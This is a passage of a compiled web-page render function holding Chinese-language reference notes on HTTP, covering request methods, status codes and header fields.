"),_("ul",[_("li",[e._v("对Alt-Svc的支持允许了给定资源的位置和资源鉴定，允许了更智能的CDN缓冲机制。")]),e._v(" "),_("li",[e._v("Client-Hints 的引入允许浏览器或者客户端来主动交流它的需求，或者是硬件约束的信息给服务端。")]),e._v(" "),_("li",[e._v("在Cookie头中引入安全相关的的前缀，现在帮助保证一个安全的cookie没被更改过。")])]),e._v(" "),_("p",[e._v("HTTP的进化证实了它良好的扩展性和简易性，释放了很多应用程序的创造力并且情愿使用这个协议。今天的HTTP的使用环境已经于早期1990年代大不相同。HTTP的原先的设计不负杰作之名，允许了Web在25年间和平稳健得发展。修复漏洞，同时却也保留了使HTTP如此成功的灵活性和扩展性，HTTP/2的普及也预示着这个协议的大好前程。")]),e._v(" "),_("h3",{attrs:{id:"http-3-http-over-quic"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#http-3-http-over-quic"}},[e._v("#")]),e._v(" HTTP/3 - HTTP over QUIC")]),e._v(" "),_("p",[e._v("HTTP的下一个主要版本HTTP / 3将在传输层部分使用QUIC代替TCP / TLS。")]),e._v(" "),_("h2",{attrs:{id:"http-报文-2"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#http-报文-2"}},[e._v("#")]),e._v(" HTTP 报文")]),e._v(" "),_("h3",{attrs:{id:"请求方法"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#请求方法"}},[e._v("#")]),e._v(" 请求方法")]),e._v(" "),_("p",[e._v("HTTP 定义了一组请求方法, 以表明要对给定资源执行的操作。指示针对给定资源要执行的期望动作. 虽然他们也可以是名词, 但这些请求方法有时被称为HTTP动词. 每一个请求方法都实现了不同的语义, 但一些共同的特征由一组共享:例如一个请求方法可以是 safe, idempotent, 或 cacheable。")]),e._v(" "),_("ul",[_("li",[e._v("GET\n"),_("ul",[_("li",[e._v("GET方法请求一个指定资源的表示形式. 使用GET的请求应该只被用于获取数据.")])])]),e._v(" "),_("li",[e._v("HEAD\n"),_("ul",[_("li",[e._v("HEAD方法请求一个与GET请求的响应相同的响应，但没有响应体.")]),e._v(" "),_("li",[e._v("HEAD方法的一个使用场景是在下载一个大文件前先获取其大小再决定是否要下载, 以此可以节约带宽资源。")])])]),e._v(" "),_("li",[e._v("POST\n"),_("ul",[_("li",[e._v("POST方法用于将实体提交到指定的资源，通常导致在服务器上的状态变化或副作用.")]),e._v(" "),_("li",[e._v("POST方法发送数据给服务器. 请求主体的类型由 Content-Type 首部指定.")])])]),e._v(" "),_("li",[e._v("PUT\n"),_("ul",[_("li",[e._v("PUT方法用请求有效载荷替换目标资源的所有当前表示。")]),e._v(" "),_("li",[e._v("PUT方法使用请求中的负载创建或者替换目标资源。")]),e._v(" "),_("li",[e._v("PUT 和POST方法的区别是,PUT方法是幂等的：连续调用一次或者多次的效果相同（无副作用）。连续调用同一个POST可能会带来额外的影响，比如多次提交订单。")])])]),e._v(" "),_("li",[e._v("DELETE\n"),_("ul",[_("li",[e._v("DELETE方法删除指定的资源。")])])]),e._v(" "),_("li",[e._v("CONNECT\n"),_("ul",[_("li",[e._v("CONNECT方法建立一个到由目标资源标识的服务器的隧道。")]),e._v(" "),_("li",[e._v("CONNECT方法实现用隧道协议进行TCP通信。")]),e._v(" "),_("li",[e._v("主要使用SSL(安全套接层)和TLS（传输层安全）协议把通信内容加密后经网络隧道传输。")]),e._v(" "),_("li",[e._v("CONNECT是一个应用范围为点到点的方法。")])])]),e._v(" "),_("li",[e._v("OPTIONS\n"),_("ul",[_("li",[e._v("OPTIONS方法用于描述目标资源的通信选项。")]),e._v(" "),_("li",[e._v("客户端可以对特定的 URL 使用 OPTIONS 方法，也可以对整站（通过将 URL 设置为“*”）使用该方法。")])])]),e._v(" "),_("li",[e._v("TRACE\n"),_("ul",[_("li",[e._v("TRACE方法沿着到目标资源的路径执行一个消息环回测试。")]),e._v(" "),_("li",[e._v("提供了一种实用的 debug 机制。")]),e._v(" "),_("li",[e._v("请求的最终接收者应当原样返回它接收到的消息，作为一个"),_("code",[e._v("Content-Type")]),e._v(" 为 "),_("code",[e._v("message/http")]),e._v("  的200（OK）响应的消息的主体（body）返回给客户端 。")])])]),e._v(" "),_("li",[e._v("PATCH\n"),_("ul",[_("li",[e._v("PATCH方法用于对资源应用部分修改。")]),e._v(" "),_("li",[e._v("不同于  PUT 方法，而与 POST 方法类似，PATCH  方法是非幂等的，这就意味着连续多个的相同请求会产生不同的效果。")])])])]),e._v(" "),_("h3",{attrs:{id:"状态码"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#状态码"}},[e._v("#")]),e._v(" 状态码")]),e._v(" "),_("p",[e._v("HTTP 响应状态代码指示特定 HTTP 请求是否已成功完成。响应分为五类：信息响应(100–199)，成功响应(200–299)，重定向(300–399)，客户端错误(400–499)和服务器错误 (500–599)。")]),e._v(" "),_("h4",{attrs:{id:"信息响应-100-199"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#信息响应-100-199"}},[e._v("#")]),e._v(" 信息响应(100–199)")]),e._v(" "),_("ul",[_("li",[e._v("100 Continue\n"),_("ul",[_("li",[e._v("这个临时响应表明，迄今为止的所有内容都是可行的，客户端应该继续请求，如果已经完成，则忽略它。")])])]),e._v(" "),_("li",[e._v("101 Switching Protocol\n"),_("ul",[_("li",[e._v("该代码是响应客户端的 Upgrade 标头发送的，并且指示服务器也正在切换的协议。")])])]),e._v(" "),_("li",[e._v("102 Processing (WebDAV)\n"),_("ul",[_("li",[e._v("此代码表示服务器已收到并正在处理该请求，但没有响应可用。")])])]),e._v(" "),_("li",[e._v("103 Early Hints\n"),_("ul",[_("li",[e._v("此状态代码主要用于与Link 链接头一起使用，以允许用户代理在服务器仍在准备响应时开始预加载资源。")])])])]),e._v(" "),_("h4",{attrs:{id:"成功响应-200-299"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#成功响应-200-299"}},[e._v("#")]),e._v(" 成功响应(200–299)")]),e._v(" "),_("ul",[_("li",[_("strong",[e._v("200 OK")]),e._v(" "),_("ul",[_("li",[e._v("请求成功。成功的含义取决于HTTP方法：\n"),_("ul",[_("li",[e._v("GET：资源已被提取并在消息正文中传输。")]),e._v(" "),_("li",[e._v("HEAD：实体标头位于消息正文中。")]),e._v(" "),_("li",[e._v("POST：描述动作结果的资源在消息体中传输。")]),e._v(" "),_("li",[e._v("TRACE：消息正文包含服务器收到的请求消息")])])])])]),e._v(" "),_("li",[_("strong",[e._v("201 Created")]),e._v(" "),_("ul",[_("li",[e._v("该请求已成功，并因此创建了一个新的资源。这通常是在POST请求，或是某些PUT请求之后返回的响应。")])])]),e._v(" "),_("li",[_("strong",[e._v("202 Accepted")]),e._v(" "),_("ul",[_("li",[e._v("请求已经接收到，但还未响应，没有结果。意味着不会有一个异步的响应去表明当前请求的结果，预期另外的进程和服务去处理请求，或者批处理。")])])]),e._v(" "),_("li",[e._v("203 Non-Authoritative Information\n"),_("ul",[_("li",[e._v("服务器已成功处理了请求，但返回的实体头部元信息不是在原始服务器上有效的确定集合，而是来自本地或者第三方的拷贝。当前的信息可能是原始版本的子集或者超集。例如，包含资源的元数据可能导致原始服务器知道元信息的超集。使用此状态码不是必须的，而且只有在响应不使用此状态码便会返回200 OK的情况下才是合适的。")])])]),e._v(" "),_("li",[_("strong",[e._v("204 No Content")]),e._v(" "),_("ul",[_("li",[e._v("服务器成功处理了请求，但不需要返回任何实体内容，并且希望返回更新了的元信息。响应可能通过实体头部的形式，返回新的或更新后的元信息。如果存在这些头部信息，则应当与所请求的变量相呼应。如果客户端是浏览器的话，那么用户浏览器应保留发送了该请求的页面，而不产生任何文档视图上的变化，即使按照规范新的或更新后的元信息应当被应用到用户浏览器活动视图中的文档。由于204响应被禁止包含任何消息体，因此它始终以消息头后的第一个空行结尾。")])])]),e._v(" "),_("li",[e._v("205 Reset Content\n"),_("ul",[_("li",[e._v("服务器成功处理了请求，且没有返回任何内容。但是与204响应不同，返回此状态码的响应要求请求者重置文档视图。该响应主要是被用于接受用户输入后，立即重置表单，以便用户能够轻松地开始另一次输入。与204响应一样，该响应也被禁止包含任何消息体，且以消息头后的第一个空行结束。")])])]),e._v(" "),_("li",[_("strong",[e._v("206 Partial Content")]),e._v(" "),_("ul",[_("li",[e._v("服务器已经成功处理了部分 GET 请求。类似于 FlashGet 或者迅雷这类的 HTTP 下载工具都是使用此类响应实现断点续传或者将一个大文档分解为多个下载段同时下载。该请求必须包含 Range 头信息来指示客户端希望得到的内容范围，并且可能包含 If-Range 来作为请求条件。")])])]),e._v(" "),_("li",[e._v("207 Multi-Status (WebDAV)\n"),_("ul",[_("li",[e._v("由WebDAV(RFC 2518)扩展的状态码，代表之后的消息体将是一个XML消息，并且可能依照之前子请求数量的不同，包含一系列独立的响应代码。")])])]),e._v(" "),_("li",[e._v("208 Already Reported (WebDAV)\n"),_("ul",[_("li",[e._v("在 DAV 里面使用: propstat 响应元素以避免重复枚举多个绑定的内部成员到同一个集合。")])])]),e._v(" "),_("li",[e._v("226 IM Used (HTTP Delta encoding)\n"),_("ul",[_("li",[e._v("服务器已经完成了对资源的 GET 请求，并且响应是对当前实例应用的一个或多个实例操作结果的表示。")])])])]),e._v(" "),_("h4",{attrs:{id:"重定向-300-399"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#重定向-300-399"}},[e._v("#")]),e._v(" 重定向(300–399)")]),e._v(" "),_("ul",[_("li",[e._v("300 Multiple Choice\n"),_("ul",[_("li",[e._v("被请求的资源有一系列可供选择的回馈信息，每个都有自己特定的地址和浏览器驱动的商议信息。用户或浏览器能够自行选择一个首选的地址进行重定向。")])])]),e._v(" "),_("li",[_("strong",[e._v("301 Moved Permanently")]),e._v(" "),_("ul",[_("li",[e._v("被请求的资源已永久移动到新位置，并且将来任何对此资源的引用都应该使用本响应返回的若干个 URI 之一。如果可能，拥有链接编辑功能的客户端应当自动把请求的地址修改为从服务器反馈回来的地址。除非额外指定，否则这个响应也是可缓存的。")])])]),e._v(" "),_("li",[_("strong",[e._v("302 Found")]),e._v(" "),_("ul",[_("li",[e._v("请求的资源现在临时从不同的 URI 响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。")])])]),e._v(" "),_("li",[_("strong",[e._v("303 See Other")]),e._v(" "),_("ul",[_("li",[e._v("对应当前请求的响应可以在另一个 URI 上被找到，而且客户端应当采用 GET 的方式访问那个资源。这个方法的存在主要是为了允许由脚本激活的POST请求输出重定向到一个新的资源。")])])]),e._v(" "),_("li",[_("strong",[e._v("304 Not Modified")]),e._v(" "),_("ul",[_("li",[e._v("如果客户端发送了一个带条件的 GET 请求且该请求已被允许，而文档的内容（自上次访问以来或者根据请求的条件）并没有改变，则服务器应当返回这个状态码。304 响应禁止包含消息体，因此始终以消息头后的第一个空行结尾。")])])]),e._v(" "),_("li",[_("strong",[e._v("307 Temporary Redirect")]),e._v(" "),_("ul",[_("li",[e._v("请求的资源现在临时从不同的URI 响应请求。由于这样的重定向是临时的，客户端应当继续向原有地址发送以后的请求。只有在Cache-Control或Expires中进行了指定的情况下，这个响应才是可缓存的。")])])]),e._v(" "),_("li",[e._v("308 Permanent Redirect\n"),_("ul",[_("li",[e._v("这意味着资源现在永久位于由 Location: HTTP Response 标头指定的另一个 URI。 这与 301 Moved Permanently HTTP 响应代码具有相同的语义，但用户代理不能更改所使用的 HTTP 方法：如果在第一个请求中使用 POST，则必须在第二个请求中使用 POST。")])])])]),e._v(" "),_("h4",{attrs:{id:"客户端错误-400-499"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#客户端错误-400-499"}},[e._v("#")]),e._v(" 客户端错误(400–499)")]),e._v(" "),_("ul",[_("li",[_("strong",[e._v("400 Bad Request")]),e._v(" "),_("ul",[_("li",[e._v("语义有误，当前请求无法被服务器理解。除非进行修改，否则客户端不应该重复提交这个请求。")]),e._v(" "),_("li",[e._v("请求参数有误。")])])]),e._v(" "),_("li",[_("strong",[e._v("401 Unauthorized")]),e._v(" "),_("ul",[_("li",[e._v("当前请求需要用户验证。该响应必须包含一个适用于被请求资源的 WWW-Authenticate 信息头用以询问用户信息。客户端可以重复提交一个包含恰当的 Authorization 头信息的请求。如果当前请求已经包含了 Authorization 证书，那么401响应代表着服务器验证已经拒绝了那些证书。如果401响应包含了与前一个响应相同的身份验证询问，且浏览器已经至少尝试了一次验证，那么浏览器应当向用户展示响应中包含的实体信息，因为这个实体信息中可能包含了相关诊断信息。")])])]),e._v(" "),_("li",[_("strong",[e._v("402 Payment Required")]),e._v(" "),_("ul",[_("li",[e._v("此响应码保留以便将来使用，创造此响应码的最初目的是用于数字支付系统，然而现在并未使用。")])])]),e._v(" "),_("li",[_("strong",[e._v("403 Forbidden")]),e._v(" "),_("ul",[_("li",[e._v("服务器已经理解请求，但是拒绝执行它。与 401 响应不同的是，身份验证并不能提供任何帮助，而且这个请求也不应该被重复提交。如果这不是一个 HEAD 请求，而且服务器希望能够讲清楚为何请求不能被执行，那么就应该在实体内描述拒绝的原因。当然服务器也可以返回一个 404 响应，假如它不希望让客户端获得任何信息。")])])]),e._v(" "),_("li",[_("strong",[e._v("404 Not Found")]),e._v(" "),_("ul",[_("li",[e._v("请求失败，请求所希望得到的资源未被在服务器上发现。没有信息能够告诉用户这个状况到底是暂时的还是永久的。假如服务器知道情况的话，应当使用410状态码来告知旧资源因为某些内部的配置机制问题，已经永久的不可用，而且没有任何可以跳转的地址。404这个状态码被广泛应用于当服务器不想揭示到底为何请求被拒绝或者没有其他适合的响应可用的情况下。")])])]),e._v(" "),_("li",[_("strong",[e._v("405 Method Not Allowed")]),e._v(" "),_("ul",[_("li",[e._v("请求行中指定的请求方法不能被用于请求相应的资源。该响应必须返回一个Allow 头信息用以表示出当前资源能够接受的请求方法的列表。 鉴于 PUT，DELETE 方法会对服务器上的资源进行写操作，因而绝大部分的网页服务器都不支持或者在默认配置下不允许上述请求方法，对于此类请求均会返回405错误。")])])]),e._v(" "),_("li",[e._v("406 Not Acceptable\n"),_("ul",[_("li",[e._v("请求的资源的内容特性无法满足请求头中的条件，因而无法生成响应实体。")])])]),e._v(" "),_("li",[e._v("407 Proxy Authentication Required\n"),_("ul",[_("li",[e._v("与401响应类似，只不过客户端必须在代理服务器上进行身份验证。代理服务器必须返回一个 Proxy-Authenticate 用以进行身份询问。客户端可以返回一个 Proxy-Authorization 信息头用以验证。")])])]),e._v(" "),_("li",[e._v("408 Request Timeout\n"),_("ul",[_("li",[e._v("请求超时。客户端没有在服务器预备等待的时间内完成一个请求的发送。客户端可以随时再次提交这一请求而无需进行任何更改。")])])]),e._v(" "),_("li",[e._v("409 Conflict\n"),_("ul",[_("li",[e._v("由于和被请求的资源的当前状态之间存在冲突，请求无法完成。这个代码只允许用在这样的情况下才能被使用：用户被认为能够解决冲突，并且会重新提交新的请求。该响应应当包含足够的信息以便用户发现冲突的源头。")])])]),e._v(" "),_("li",[e._v("410 Gone\n"),_("ul",[_("li",[e._v("被请求的资源在服务器上已经不再可用，而且没有任何已知的转发地址。这样的状况应当被认为是永久性的。如果可能，拥有链接编辑功能的客户端应当在获得用户许可后删除所有指向这个地址的引用。如果服务器不知道或者无法确定这个状况是否是永久的，那么就应该使用 404 状态码。除非额外说明，否则这个响应是可缓存的。")])])]),e._v(" "),_("li",[e._v("411 Length Required\n"),_("ul",[_("li",[e._v("服务器拒绝在没有定义 Content-Length 头的情况下接受请求。在添加了表明请求消息体长度的有效 Content-Length 头之后，客户端可以再次提交该请求。")])])]),e._v(" "),_("li",[e._v("412 Precondition Failed\n"),_("ul",[_("li",[e._v("服务器在验证在请求的头字段中给出先决条件时，没能满足其中的一个或多个。这个状态码允许客户端在获取资源时在请求的元信息（请求头字段数据）中设置先决条件，以此避免该请求方法被应用到其希望的内容以外的资源上。")])])]),e._v(" "),_("li",[e._v("413 Payload Too Large\n"),_("ul",[_("li",[e._v("服务器拒绝处理当前请求，因为该请求提交的实体数据大小超过了服务器愿意或者能够处理的范围。此种情况下，服务器可以关闭连接以免客户端继续发送此请求。如果这个状况是临时的，服务器应当返回一个 Retry-After 的响应头，以告知客户端可以在多少时间以后重新尝试。")])])]),e._v(" "),_("li",[e._v("414 URI Too Long\n"),_("ul",[_("li",[e._v("请求的URI 长度超过了服务器能够解释的长度，因此服务器拒绝对该请求提供服务。这比较少见，通常的情况包括：本应使用POST方法的表单提交变成了GET方法，导致查询字符串（Query String）过长。")])])]),e._v(" "),_("li",[e._v("415 Unsupported Media Type\n"),_("ul",[_("li",[e._v("对于当前请求的方法和所请求的资源，请求中提交的实体并不是服务器中所支持的格式，因此请求被拒绝。")])])]),e._v(" "),_("li",[e._v("416 Range Not Satisfiable\n"),_("ul",[_("li",[e._v("如果请求中包含了 Range 请求头，并且 Range 中指定的任何数据范围都与当前资源的可用范围不重合，同时请求中又没有定义 If-Range 请求头，那么服务器就应当返回416状态码。")])])]),e._v(" "),_("li",[e._v("417 Expectation Failed\n"),_("ul",[_("li",[e._v("此响应代码意味着服务器无法满足 Expect 请求标头字段指示的期望值。")])])]),e._v(" "),_("li",[e._v("418 I'm a teapot\n"),_("ul",[_("li",[e._v("服务器拒绝尝试用 “茶壶冲泡咖啡”。")])])]),e._v(" "),_("li",[e._v("421 Misdirected Request\n"),_("ul",[_("li",[e._v("该请求针对的是无法产生响应的服务器。 这可以由服务器发送，该服务器未配置为针对包含在请求 URI 中的方案和权限的组合产生响应。")])])]),e._v(" "),_("li",[e._v("422 Unprocessable Entity (WebDAV)\n"),_("ul",[_("li",[e._v("请求格式良好，但由于语义错误而无法遵循。")])])]),e._v(" "),_("li",[e._v("423 Locked (WebDAV)\n"),_("ul",[_("li",[e._v("正在访问的资源被锁定。")])])]),e._v(" "),_("li",[e._v("424 Failed Dependency (WebDAV)\n"),_("ul",[_("li",[e._v("由于先前的请求失败，所以此次请求失败。")])])]),e._v(" "),_("li",[e._v("425 Too Early\n"),_("ul",[_("li",[e._v("服务器不愿意冒着风险去处理可能重播的请求。")])])]),e._v(" "),_("li",[e._v("426 Upgrade Required\n"),_("ul",[_("li",[e._v("服务器拒绝使用当前协议执行请求，但可能在客户机升级到其他协议后愿意这样做。 服务器在 426 响应中发送 Upgrade 头以指示所需的协议。")])])]),e._v(" "),_("li",[e._v("428 Precondition Required\n"),_("ul",[_("li",[e._v("原始服务器要求该请求是有条件的。 旨在防止“丢失更新”问题，即客户端获取资源状态，修改该状态并将其返回服务器，同时第三方修改服务器上的状态，从而导致冲突。")])])]),e._v(" "),_("li",[e._v("429 Too Many Requests\n"),_("ul",[_("li",[e._v("用户在给定的时间内发送了太多请求（“限制请求速率”）。")])])]),e._v(" "),_("li",[e._v("431 Request Header Fields Too Large\n"),_("ul",[_("li",[e._v("服务器不愿意处理请求，因为它的 请求头字段太大（ Request Header Fields Too Large）。 请求可以在减小请求头字段的大小后重新提交。")])])]),e._v(" "),_("li",[e._v("451 Unavailable For Legal Reasons\n"),_("ul",[_("li",[e._v("用户请求非法资源，例如：由政府审查的网页。")])])])]),e._v(" "),_("h4",{attrs:{id:"服务器错误-500-599"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#服务器错误-500-599"}},[e._v("#")]),e._v(" 服务器错误 (500–599)")]),e._v(" "),_("ul",[_("li",[_("strong",[e._v("500 Internal Server Error")]),e._v(" "),_("ul",[_("li",[e._v("服务器遇到了不知道如何处理的情况。")])])]),e._v(" "),_("li",[_("strong",[e._v("501 Not Implemented")]),e._v(" "),_("ul",[_("li",[e._v("此请求方法不被服务器支持且无法被处理。只有GET和HEAD是要求服务器支持的，它们必定不会返回此错误代码。")])])]),e._v(" "),_("li",[_("strong",[e._v("502 Bad Gateway")]),e._v(" "),_("ul",[_("li",[e._v("此错误响应表明服务器作为网关需要得到一个处理这个请求的响应，但是得到一个错误的响应。")])])]),e._v(" "),_("li",[_("strong",[e._v("503 Service Unavailable")]),e._v(" "),_("ul",[_("li",[e._v("服务器没有准备好处理请求。 常见原因是服务器因维护或重载而停机。 请注意，与此响应一起，应发送解释问题的用户友好页面。 这个响应应该用于临时条件和 Retry-After：如果可能的话，HTTP头应该包含恢复服务之前的估计时间。 网站管理员还必须注意与此响应一起发送的与缓存相关的标头，因为这些临时条件响应通常不应被缓存。")])])]),e._v(" "),_("li",[e._v("504 Gateway Timeout\n"),_("ul",[_("li",[e._v("当服务器作为网关，不能及时得到响应时返回此错误代码。")])])]),e._v(" "),_("li",[e._v("505 HTTP Version Not Supported\n"),_("ul",[_("li",[e._v("服务器不支持请求中所使用的HTTP协议版本。")])])]),e._v(" "),_("li",[e._v("506 Variant Also Negotiates\n"),_("ul",[_("li",[e._v("服务器有一个内部配置错误：对请求的透明内容协商导致循环引用。")])])]),e._v(" "),_("li",[e._v("507 Insufficient Storage\n"),_("ul",[_("li",[e._v("服务器有内部配置错误：所选的变体资源被配置为参与透明内容协商本身，因此不是协商过程中的适当端点。")])])]),e._v(" "),_("li",[e._v("508 Loop Detected (WebDAV)\n"),_("ul",[_("li",[e._v("服务器在处理请求时检测到无限循环。")])])]),e._v(" "),_("li",[e._v("510 Not Extended\n"),_("ul",[_("li",[e._v("客户端需要对请求进一步扩展，服务器才能实现它。服务器会回复客户端发出扩展请求所需的所有信息。")])])]),e._v(" "),_("li",[e._v("511 Network Authentication Required\n"),_("ul",[_("li",[e._v("511 状态码指示客户端需要进行身份验证才能获得网络访问权限。")])])])]),e._v(" "),_("h3",{attrs:{id:"http首部"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#http首部"}},[e._v("#")]),e._v(" HTTP首部")]),e._v(" "),_("p",[e._v("HTTP协议的请求和响应报文中必定包含HTTP首部。首部内容为客户端和服务器分别处理请求和响应提供所需要的信息。")]),e._v(" "),_("p",[e._v("根据不同上下文，可将消息头分为：")]),e._v(" "),_("ul",[_("li",[e._v("通用首部：同时适用于请求和响应消息，但与最终消息主体中传输的数据无关的消息头。")]),e._v(" "),_("li",[e._v("请求首部：包含更多有关要获取的资源或客户端本身信息的消息头。")]),e._v(" "),_("li",[e._v("响应首部：包含有关响应的补充信息，如其位置或服务器本身（名称和版本等）的消息头。")]),e._v(" "),_("li",[e._v("实体首部：包含有关实体主体的更多信息，比如主体长(Content-Length)度或其MIME类型。")])]),e._v(" "),_("p",[e._v("消息头也可以根据代理对其的处理方式分为：")]),e._v(" "),_("ul",[_("li",[e._v("端到端消息头\n"),_("ul",[_("li",[e._v("这类消息头必须被传输到最终的消息接收者，也即，请求的服务器或响应的客户端。中间的代理服务器必须转发未经修改的端到端消息头，并且必须缓存它们。")])])]),e._v(" "),_("li",[e._v("逐跳消息头\n"),_("ul",[_("li",[e._v("这类消息头仅对单次传输连接有意义，不能通过代理或缓存进行重新转发。这些消息头包括 "),_("code",[e._v("Connection")]),e._v(", "),_("code",[e._v("Keep-Alive")]),e._v(", "),_("code",[e._v("Proxy-Authenticate")]),e._v(", "),_("code",[e._v("Proxy-Authorization")]),e._v(", "),_("code",[e._v("TE")]),e._v(", "),_("code",[e._v("Trailer")]),e._v(", "),_("code",[e._v("Transfer-Encoding")]),e._v(" 及 "),_("code",[e._v("Upgrade")]),e._v("。注意，只能使用 "),_("code",[e._v("Connection")]),e._v(" 来设置逐跳一般头。")])])])]),e._v(" "),_("h4",{attrs:{id:"通用首部字段"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#通用首部字段"}},[e._v("#")]),e._v(" 通用首部字段")]),e._v(" "),_("table",[_("thead",[_("tr",[_("th",[e._v("首部字段名")]),e._v(" "),_("th",[e._v("说明")])])]),e._v(" "),_("tbody",[_("tr",[_("td",[e._v("Cache-Conctrol")]),e._v(" "),_("td",[e._v("控制缓存的行为")])]),e._v(" "),_("tr",[_("td",[e._v("Connection")]),e._v(" "),_("td",[e._v("逐跳首部、连接的管理")])]),e._v(" "),_("tr",[_("td",[e._v("Date")]),e._v(" "),_("td",[e._v("创建报文的日期时间")])]),e._v(" "),_("tr",[_("td",[e._v("Pragma")]),e._v(" "),_("td",[e._v("报文指令")])]),e._v(" "),_("tr",[_("td",[e._v("Trailer")]),e._v(" "),_("td",[e._v("报文末端的首部一览")])]),e._v(" "),_("tr",[_("td",[e._v("Transfer-Encoding")]),e._v(" "),_("td",[e._v("指定报文主体的传输编码方式")])]),e._v(" "),_("tr",[_("td",[e._v("Upgrade")]),e._v(" "),_("td",[e._v("升级为其他协议")])]),e._v(" "),_("tr",[_("td",[e._v("Via")]),e._v(" "),_("td",[e._v("代理服务器的相关信息")])]),e._v(" "),_("tr",[_("td",[e._v("Warning")]),e._v(" "),_("td",[e._v("错误通知")])])])]),e._v(" "),_("h4",{attrs:{id:"请求首部字段"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#请求首部字段"}},[e._v("#")]),e._v(" 请求首部字段")]),e._v(" "),_("table",[_("thead",[_("tr",[_("th",[e._v("首部字段名")]),e._v(" "),_("th",[e._v("说明")])])]),e._v(" "),_("tbody",[_("tr",[_("td",[e._v("Accept")]),e._v(" "),_("td",[e._v("用户代理可处理的媒体类型")])]),e._v(" "),_("tr",[_("td",[e._v("Accept-Charset")]),e._v(" "),_("td",[e._v("优先的字符集")])]),e._v(" "),_("tr",[_("td",[e._v("Accept-Encoding")]),e._v(" "),_("td",[e._v("优先的内容编码")])]),e._v(" "),_("tr",[_("td",[e._v("Accept-Language")]),e._v(" "),_("td",[e._v("优先的语言（自然语言）")])]),e._v(" "),_("tr",[_("td",[e._v("Authorization")]),e._v(" "),_("td",[e._v("Web认证信息")])]),e._v(" "),_("tr",[_("td",[e._v("Expect")]),e._v(" "),_("td",[e._v("期待服务器的特定行为")])]),e._v(" "),_("tr",[_("td",[e._v("From")]),e._v(" "),_("td",[e._v("用户的电子邮箱地址")])]),e._v(" "),_("tr",[_("td",[e._v("Host")]),e._v(" "),_("td",[e._v("请求资源所在服务器")])]),e._v(" "),_("tr",[_("td",[e._v("If-Match")]),e._v(" "),_("td",[e._v("比较实体标记（ETag）")])]),e._v(" "),_("tr",[_("td",[e._v("If-Modified-Since")]),e._v(" "),_("td",[e._v("比较资源的更新时间")])]),e._v(" "),_("tr",[_("td",[e._v("If-None-Match")]),e._v(" "),_("td",[e._v("比较实体标记（与If-Match相反）")])]),e._v(" "),_("tr",[_("td",[e._v("If-Range")]),e._v(" "),_("td",[e._v("资源未更新时发送实体Byte的范围请求")])]),e._v(" "),_("tr",[_("td",[e._v("If-Unmodified-Since")]),e._v(" "),_("td",[e._v("比较资源的更新时间（与If-Modified-Since相反）")])]),e._v(" "),_("tr",[_("td",[e._v("Max-Forwards")]),e._v(" "),_("td",[e._v("最大传输逐跳数")])]),e._v(" "),_("tr",[_("td",[e._v("Proxy-Authorization")]),e._v(" "),_("td",[e._v("代理服务器要求客户端的认证信息")])]),e._v(" "),_("tr",[_("td",[e._v("Range")]),e._v(" "),_("td",[e._v("实体的字节范围请求")])]),e._v(" "),_("tr",[_("td",[e._v("Referer")]),e._v(" "),_("td",[e._v("对请求中URI的原始获取方")])]),e._v(" "),_("tr",[_("td",[e._v("TE")]),e._v(" "),_("td",[e._v("传输编码的优先级")])]),e._v(" "),_("tr",[_("td",[e._v("User-Agent")]),e._v(" "),_("td",[e._v("HTTP客户端程序的信息")])])])]),e._v(" "),_("h4",{attrs:{id:"响应首部字段"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#响应首部字段"}},[e._v("#")]),e._v(" 响应首部字段")]),e._v(" "),_("table",[_("thead",[_("tr",[_("th",[e._v("首部字段名")]),e._v(" "),_("th",[e._v("说明")])])]),e._v(" "),_("tbody",[_("tr",[_("td",[e._v("Accept-Ranges")]),e._v(" "),_("td",[e._v("是否接受字节范围请求")])]),e._v(" "),_("tr",[_("td",[e._v("Age")]),e._v(" "),_("td",[e._v("推算资源创建经过时间")])]),e._v(" "),_("tr",[_("td",[e._v("ETag")]),e._v(" "),_("td",[e._v("资源的匹配信息")])]),e._v(" "),_("tr",[_("td",[e._v("Location")]),e._v(" "),_("td",[e._v("令客户端重定向至指定URI")])]),e._v(" "),_("tr",[_("td",[e._v("Proxy-Authenticate")]),e._v(" "),_("td",[e._v("代理服务器对客户端的认证信息")])]),e._v(" "),_("tr",[_("td",[e._v("Retry-After")]),e._v(" "),_("td",[e._v("对再次发起请求的时机要求")])]),e._v(" "),_("tr",[_("td",[e._v("Server")]),e._v(" "),_("td",[e._v("HTTP服务器的安装信息")])]),e._v(" "),_("tr",[_("td",[e._v("Vary")]),e._v(" "),_("td",[e._v("代理服务器缓存的管理信息")])]),e._v(" "),_("tr",[_("td",[e._v("WWW-Authenticate")]),e._v(" "),_("td",[e._v("服务器对客户端的认证信息")])])])]),e._v(" "),_("h4",{attrs:{id:"实体首部字段"}},[_("a",{staticClass:"header-anchor",attrs:{href:"#实体首部字段"}},[e._v("#")]),e._v(" 实体首部字段")]),e._v(" "),_("table",[_("thead",[_("tr",[_("th",[e._v("首部字段名")]),e._v(" "),_("th",[e._v("说明")])])]),e._v(" "),_("tbody",[_("tr",[_("td",[e._v("Allow")]),e._v(" "),_("td",[e._v("资源可支持的HTTP方法")])]),e._v(" "),_("tr",[_("td",[e._v("Content-Encoding")]),e._v(" "),_("td",[e._v("实体主体适用的编码方式")])]),e._v(" "),_("tr",[_("td",[e._v("Content-Language")]),e._v(" "),_("td",[e._v("实体主体的自然语言")])]),e._v(" "),_("tr",[_("td",[e._v("Content-Length")]),e._v(" "),_("td",[e._v("实体主体的大小（单位：字节）")])]),e._v(" "),_("tr",[_("td",[e._v("Content-Location")]),e._v(" "),_("td",[e._v("替代对应资源的URI")])]),e._v(" "),_("tr",[_("td",[e._v("Content-MD5")]),e._v(" "),_("td",[e._v("实体主体的报文摘要")])]),e._v(" 